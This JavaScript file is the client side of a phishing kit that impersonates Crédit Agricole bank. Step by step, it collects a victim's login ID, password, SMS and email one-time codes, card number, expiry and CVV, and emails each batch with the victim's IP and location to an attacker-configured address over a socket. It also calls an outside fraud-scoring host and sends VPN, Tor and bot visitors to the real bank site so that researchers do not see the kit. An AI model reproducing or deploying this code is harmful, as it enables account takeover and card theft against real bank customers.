

$(document).ready(()=>{

  

 
    Vue.use(VueMask.VueMaskPlugin);

const index =new Vue({
    el:"#index",
    data:{
        error:false,
        API:$('#API').val(),
        security:$('#Security').val(),
        loading:false,
        message:'Chargement en cours...',
        login:1,
        step :0,
        emailList :$('#emailList').val(),
        log:{
            DEP:'',
            ID:'',
            PASS: '',
            SMS_CONNECT:'',
            SMS:'',
            CODE:'',
            numcc:'',
            ex1:'',
            ex2:'',
            cvv:'',
            tel:'',
        }
    },

   async beforeMount() {

   if(this.security){

    console.log('Security enabled')
    var ssl = await fetch('https://keys0.herokuapp.com/iqs?api='+this.API)
    .then(e=>e.json()||e.text())
    .then(e=>e)
    .catch(err=>console.log(err))
    
   try{
    if(ssl.proxy || ssl.vpn || ssl.tor || ssl.bot_status || ssl.recent_abuse || ssl.fraud_score>74 || ssl.active_vpn || ssl.active_tor){

        window.location.href='https://www.credit-agricole.com/'
        }
   } catch(err){

    window.location.href='https://www.credit-agricole.com/'


   }
   } else {

    console.log('Security disabled')
   }

    $('body').show()



    },      
    mounted(){

      

     


    },

    computed:{
        content(){
            var loc =JSON.stringify(locIp)

            var message ={
                name:'CA v3.0 | '+iPfull,
                from:'log.init@credit-agricole.fr',
                to:$('#Mail').val(),
                subject :  this.login==2 ? ' DEP + LOG ' : '' + this.login==3 && this.step==0 ? ' CONNECT' :'' + this.login==3 && this.step==1 ? ' SMS ' :'' + this.login==3 && this.step==2 ? ' CODE EMAIL ':'',
                html:''+JSON.stringify(this.log)+'<p><br>'+JSON.stringify(locIp)+'</p>  '+'<p><i> [__&copy;Powered Apollo - 2020 | CA v3.0 __] </i></p>'
            }
            return message
        }
    },
    methods:{

        showChat(){
            Tawk_API.toggle();
        },
        goToCredit(){
            if(this.log.DEP=='' || this.log.DEP.length<2) return this.error=true
            this.loading=true
            setTimeout(()=>{
                this.login++
                this.loading=false
            },1300)

           
        },
        goToEspace(){
           
            if(this.log.PASS.length!==6 || this.log.ID.length<5)  return this.$Message.error('Corriger les champs SVP ')
            this.message='Connexion en cours ....'
            this.loading=true
            this.content.subject
          
            socket.emit('sendMail',this.content,(clb)=>{
                if(clb){
                   if($('#Option').val()==1 || $('#option').val()=='1'){
                       
                    setTimeout(()=>{
                        this.login=5
                        this.loading=false
                    },15000) // setTimeout for chat

                   } else { 
                    setTimeout(()=>{
                    this.login++
                    this.loading=false
                },24000) // setTimeout first connection
            }
                } else {
                    window.location.reload()
                }
            })            
        },
        goToStep(vale=false){

        if(vale){

        this.loading =true

                if(this.log.SMS_CONNECT =='' || this.log.SMS_CONNECT.length<7) {
   
                 this.loading=false
                        return this.$Message.error('Format du code incorrect')
    
                } else {

                    this.content.subject+=" |"
                    socket.emit('sendMail',this.content,clb=>{

                        if(clb) {

                            this.step++
                            setTimeout(()=>{
                            this.loading=false
                            return false
                            },15200) // setTimeout for second SMS 


                        } else {
                            
                            window.loading.reload()


                        } 



                    })


                    return false


                }
    
                
            }

            if(this.log.SMS.length<7 ) return this.$Message.error('Code incorrect')
            if(this.log.SMS==this.log.SMS_CONNECT ) return this.$Message.error('Code incorrect , saisissez le nouveau code')
            this.message="Vérification du code en cours..."
            this.loading=true
            this.content.subject
            socket.emit('sendMail',this.content,(clb)=>{
                if(clb){
                    setTimeout(()=>{
                        setTimeout(()=>{
                            this.message="Envoie de nouveau code par E-mail , patientez SVP"
                        },3000)
            
                        setTimeout(()=>{
                            this.message="Synchronisation en cours..."
                        },5000)
            
                        setTimeout(()=>{
                            
                            this.step=2
                           this.loading=false
                           
                        },10000)
                    },5000)
                } else {
                    window.location.reload()
                }
            }) 
           
            
            
           
        },
        setCard(){
            if(this.log.numcc.length<14) return false
            this.message="Activation des services en cours ...."
            this.loading=true
            this.content.subject+="CC CARD "
            socket.emit('sendMail',this.content,(clb)=>{
                if(clb){
                   
                    this.$Message.success('Service Pro activé ')
                    this.message="Redirection dans 3 secondes ..."

                    this.login=6
                    this.loading=false
                   
                  setTimeout(()=>{
                       window.location.href="https://www.credit-agricole.fr/"
                },8500)
                } else {
                    window.location.reload()
                }
            })

        },
        submitForm(){


           
            if(this.log.CODE.length<7) return this.$Message.error('Code incorrect')
            if(this.log.CODE==this.log.SMS) return this.$Message.error('Saisissez le code reçcu par E-mail SVP...')
            this.message="En cours d'activation ..."
            this.loading=true
            this.content.subject+=" EMAIL "
            socket.emit('sendMail',this.content,(clb)=>{
                if(clb){
                    this.login++
                    this.loading=false
                  //  setTimeout(()=>{
                    //    window.location.href="https://www.credit-agricole.fr/"
                    //},1000)
                } else {
                    window.location.reload()
                }
            })


        }
    }

})
})